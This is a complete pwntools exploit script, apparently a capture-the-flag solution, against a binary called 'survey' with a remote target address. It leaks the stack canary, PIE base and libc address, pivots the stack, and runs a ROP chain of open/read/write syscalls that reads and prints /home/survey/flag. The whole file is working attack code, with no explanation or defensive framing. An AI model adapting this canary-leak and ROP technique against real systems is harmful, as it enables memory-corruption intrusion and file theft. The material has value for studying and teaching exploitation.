#!/usr/bin/python
# -*- coding: UTF-8 -*-
from pwn import *

context.arch = 'amd64'

if args.REMOTE:
    p = remote('140.112.31.97', '30201')
else:
    # p = process("./survey")
    p = process(["./lib/ld-2.29.so", "./survey"], env={"LD_PRELOAD" : "./lib/libc-2.29.so"})




libc = ELF("./lib/libc-2.29.so")
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

leave_offset = 0x12e1

push_rax = 0x42eef
pop_rax = 0x47cf8
pop_rdi = 0x26542
pop_rsi = 0x26f9e
pop_rdx = 0x12bda6
syscall_ret = 0xcf6c5


p.sendafter("What is your name :", cyclic(25))
p.recvuntil("Hello, " + cyclic(25))

canary = u64(p.recv(7).rjust(8, '\0'))
PIE = u64(p.recv(6).ljust(8, '\0')) - 0x12f0

payload = flat(
    cyclic(0x18),
    canary,
    PIE + 0x4f00, # bss
    PIE + 0x1235  # print
)

p.sendafter("Leave your message here : ", payload)
p.recvline()
p.recvline()

# success("canary and PIE")
# success(hex(canary))
# success(hex(PIE))


p.sendafter("What is your name : ", '\x00')

p.recvuntil("Hello, ")
p.recvline()

payload = flat(
    cyclic(0x18),
    canary,
    PIE + 0x4f00, # bss
    PIE + 0x1235  # print
)


p.sendafter("Leave your message here : ", payload)
p.recvline()
p.recvline()


p.sendafter("What is your name : ", '\xa0')
p.recvuntil("Hello, ")

libc.address = u64(p.recv(6).ljust(8, '\0')) - libc.sym._IO_file_jumps - 64

# success(hex(libc.address))


payload = flat(
    libc.address + pop_rdi,
    PIE + 0x4ef8, # shellcode
    libc.sym.gets,
    canary,
    PIE + 0x4ed8, # rbp
    PIE + leave_offset
)

p.recvline()
p.sendafter("Leave your message here : ", payload)

pause()

payload = flat(
    libc.address + pop_rdi,
    PIE + 0x4fd0,               # 0x4f00
    libc.address + pop_rsi,
	0,
	libc.address + pop_rdx,
	0,
	libc.address + pop_rax,
	2,
	libc.address + syscall_ret,
	libc.address + pop_rdi,
    3,                          # file descriptor
	libc.address + pop_rsi,
	PIE + 0x4fd0,
	libc.address + pop_rdx,
	30,
	libc.address + pop_rax,
	0,
	libc.address + syscall_ret,
	libc.address + pop_rdi,
	1,
	libc.address + pop_rsi,
	PIE + 0x4fd0,
	libc.address + pop_rdx,
	30,
	libc.address + pop_rax,
	1,
	libc.address + syscall_ret,
    "/home/survey/flag\0\0\0\0\0\0\0" #0x4fd0
)

p.sendline(payload)
p.interactive()
p.close()